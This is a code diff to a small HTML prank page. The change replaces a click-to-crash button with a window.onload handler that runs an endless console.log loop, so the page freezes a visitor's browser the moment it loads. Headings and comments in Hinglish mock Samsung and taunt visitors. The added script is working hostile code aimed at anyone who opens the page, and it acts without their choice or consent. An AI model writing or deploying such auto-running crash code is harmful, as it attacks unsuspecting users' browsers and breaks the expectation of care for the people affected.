@@ -1,19 +1,18 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Browser Crash Test</title>
+    <title>Auto Crash on Load</title>
+    <script>
+      // Jaise hi page load hoga, yeh function chalega aur browser ka band bajayega
+      window.onload = function () {
+        while (true) {
+          console.log("Samsung = Sabse bekaar company! Crashing browser...");
+        }
+      };
+    </script>
   </head>
   <body>
-    <h1>Samsung Users: Brace Yourself!</h1>
-    <p>Click the button below to crash your browser (for fun).</p>
-    <button onclick="crash()">Crash Browser</button>
-
-    <script>
-      function crash() {
-        while (true) {
-          console.log("Samsung is trash! Crashing...");
-        }
-      }
-    </script>
+    <h1>Aree bhai! Tu is site pe aaya aur browser gaya!</h1>
+    <p>Samsung users already crying!</p>
   </body>
 </html>
